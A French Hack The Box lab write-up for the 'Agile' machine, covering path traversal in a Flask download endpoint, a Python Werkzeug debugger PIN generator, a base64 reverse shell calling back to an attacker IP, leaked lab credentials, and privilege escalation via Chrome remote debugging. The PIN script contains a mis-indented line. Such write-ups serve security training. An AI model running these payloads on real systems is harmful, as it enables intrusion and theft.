---
title: Agile - Medium (Linux)
img_path: "/assets/img/posts/Agile-Medium"
categories:
- Write-up
- Vulnérabilités Web
tags:
- hack-the-box
- web
- linux
---

### Nmap

```bash
──(kali㉿kali)-[~]
└─$ nmap -sV -sC -p- 10.129.160.55
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 05:19 EDT
Nmap scan report for superpass.htb (10.129.160.55)
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: SuperPassword \xF0\x9F\xA6\xB8
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds
```

### ffuf

Avec ffuf on a ce résultat pour les sous dossiers :

```bash
──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://superpass.htb/FUZZ -fs 6128 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://superpass.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 6128
________________________________________________

[Status: 302, Size: 249, Words: 18, Lines: 6, Duration: 174ms]
    * FUZZ: download

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 22ms]
    * FUZZ: static

[Status: 302, Size: 243, Words: 18, Lines: 6, Duration: 44ms]
    * FUZZ: vault
```

### Le site

Le site est une sorte de bitwarden.

On peut ajouter un mot de passe, le supprimer etc.

Il s'agit d'un site flask, on le sait en générant une erreur, par exemple à une connexion (c'est instable mais ça a tout de même permis de connaître cette information). Les champs ne semblent pas être vulnérables à une ssti, comme on s'y attend souvent avec un site sous flask.

Seule la partie download n'est pas présentée sur le site, on va donc s'empresser de voir ce qu'elle permet.

### /download

Si on tape juste le point d'accès download, on a une erreur (qui permet de confirmer qu'il s'agit d'une application flask).

![Capture d’écran du 2023-06-29 11-58-20.png](1.png)

On voit directement le code. 

Il est très simple, il prend en paramètre un argument 'fn' et cherche le fichier correspondant s'il existe.

Il n'y a **aucune** désinfection du paramètre, aussi un simple paramètre `fn=../etc/passwd` nous permet de dump le fichier sous forme de csv.

![Capture d’écran du 2023-06-29 12-01-16.png](2.png)

Il y a deux user avec un home : edwards, corum et dev_admin.

### Werkzeug

On a accès à la console, on va donc tenter de générer le pin avec le code de cette version de werkzeug :

```python
#!/usr/bin/env python3
import dotenv, hashlib, itertools

def generate_machine_id(machine_id, boot_id, cgroup):
	linux = b""

	if machine_id:
		linux += bytes(machine_id, encoding='utf-8')
	else :
		linux += bytes(boot_id, encoding='utf-8')
	linux += bytes(cgroup.split("/")[-1], encoding='utf-8')
	if linux is not None:
	return linux

def get_uuid(mac_address):
	uuid = str(int(mac_address.replace(":", ""),16))
	return uuid

def generate_pin(public_bits, private_bits):
	rv = None
	pin = None
	num = None
	hash = hashlib.sha1()
	for bit in itertools.chain(public_bits, private_bits):
		if not bit:
			continue
		if isinstance(bit, str):
			bit = bit.encode("utf-8")
		hash.update(bit)
	hash.update(b"cookiesalt")
	cookie_name = f"__wzd{hash.hexdigest()[:20]}"
	
	if num is None:
		hash.update(b"pinsalt")
	num = f"{int(hash.hexdigest(), 16):09d}"[:9]

	if rv is None:
		for group_size in 5,4,3:
			if len(num) % group_size == 0:
				rv = "-".join(
					num[x : x + group_size].rjust(group_size, "0")
					for x in range(0, len(num), group_size))
				break
		else:
			rv = num
	print(f"Public Bits : f{public_bits}")
	print(f"Pin code : {rv} | cookie name : {cookie_name}")

if __name__ == "__main__":
	env = dotenv.dotenv_values()
	machine_id = env.get("MACHINEID")
	boot_id = env.get("BOOTID")
	cgroup = env.get("CGROUP")
	username = env.get("USERNAME")
	flask_path = env.get("FLASKPATH")
	mac_address = env.get("DEVICEMACADDRESS")
	if env is None or \
	boot_id == "" or \
	cgroup == "" or \
	username == "" or \
	flask_path == "" or \
	mac_address == "":
		print("You must fill all the entries int he .env file.")
		exit(1)

	private_bits = [get_uuid(mac_address),generate_machine_id(machine_id, boot_id, cgroup)]

	print(private_bits)

	modnames = ["flask.app", "werkzeug.debug"]

	apps = ["Flask", "wsgi_app", "DebuggedApplication"]

	for modname in modnames:
		for app in apps:
			public_bits = [username, modname, app, flask_path]
			generate_pin(public_bits, private_bits)
```

Avec un .env :

```yaml
# env file used to generate the pin code for werkzeug console.

# All values are samples. Try to leak your own values !

MACHINEID="ed5b159560f54721827644bc9b220d00" # ie /etc/machine-id. If not found, refer to boot-id

BOOTID="79ebdecc-32c3-4fd7-8e35-e2b400317a57" # ie /proc/sys/kernel/random/boot_id

CGROUP="0::/system.slice/superpass.service" #ie /proc/self/cgroup

USERNAME="www-data" # ie /proc/self/environ

FLASKPATH="/app/venv/lib/python3.10/site-packages/flask/app.py"#sample

DEVICEMACADDRESS="00:50:56:96:2f:9d" # Sample. Leak /proc/net/arp then, leak /sys/class/net/<device>/address. Enter the mac address.
```

Ce qui nous donne comme résultats :

```bash
kibatche@kibatche-System-Product-Name:/media/kibatche/Achille/shared_folder_vm/HTB/Boxes/Agile$ ./werkzeug_generate_pin.py 
['345050066845', b'ed5b159560f54721827644bc9b220d00superpass.service']
Public Bits : f['www-data', 'flask.app', 'Flask', '/app/venv/lib/python3.10/site-packages/flask/app.py']
Pin code : 940-671-208 | cookie name : __wzd5b18af0a915bb04d69e0
Public Bits : f['www-data', 'flask.app', 'wsgi_app', '/app/venv/lib/python3.10/site-packages/flask/app.py']
Pin code : 107-923-781 | cookie name : __wzd3c4b320f8234bb237797
Public Bits : f['www-data', 'flask.app', 'DebuggedApplication', '/app/venv/lib/python3.10/site-packages/flask/app.py']
Pin code : 871-298-182 | cookie name : __wzd6aae691df26d92e8fe95
Public Bits : f['www-data', 'werkzeug.debug', 'Flask', '/app/venv/lib/python3.10/site-packages/flask/app.py']
Pin code : 690-460-006 | cookie name : __wzd690032cbc16664857bba
Public Bits : f['www-data', 'werkzeug.debug', 'wsgi_app', '/app/venv/lib/python3.10/site-packages/flask/app.py']
Pin code : 814-957-451 | cookie name : __wzdb0228e28f104c7a49d6e
Public Bits : f['www-data', 'werkzeug.debug', 'DebuggedApplication', '/app/venv/lib/python3.10/site-packages/flask/app.py']
Pin code : 173-461-126 | cookie name : __wzd74c32e5b18e85b88455f
```

Le second pin-code : 107-923-781 est le bon !

Dans la console on peut faire un reverse shell :

```python
__import__('os').popen('echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMzEiLDQyNDIpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oInNoIikn | base64 -d | bash').read();
```

Ce qui est en base64 représente un reverse shell avec la commande python.


### www-data

On est www-data.

On peut essayer de voir ce qui se trouve dans l'app.

Dans le dossier app, on a un fichier de lisible : la config :

```json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

On peut tenter de se connecter avec mysql.!

![Capture d’écran du 2023-06-29 16-18-34.png](3.png)

On retrouve le user corum. On voit qu'il  a un mot de passe enregistré pour agile.

On tente la connexion en ssh : bingo ! On a le user.

corum:5db7caa1d13cc37c9fc2

### Élévation de privilèges

On passe linpeas et on voit qu'il y a quelque chose de noté avec google chrome.

En cherchant on tombe sur le port forwarding de ce port, et la possibilité de leak le test du site.

On peut donc faire un portforwarding via ssh :

```bash
ssh -L 41829:127.0.0.1:41829 corum@superpass.htb
```

Ensuite on peut accéder au site via google chrome et le mode de débug à distance.

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/

On peut accéder au site test et tomber sur une nouvelle paire utilisateur/mot de passe :

```html
    <td>agile</td>
    <td>edwards</td>
    <td>d07867c6267dcb5df0af</td>
    ```

Cela ne nous mène pas à root, mais peut-être que ce user nous mènera à root.

edwards:d07867c6267dcb5df0af

En faisant sudo -l on voit qu'on peut exécuter sudoeit avec les droit de dev_admin.


On peut changer le script activate et faire un reverse shell qui nous donne accès à root.

Excellente machine.
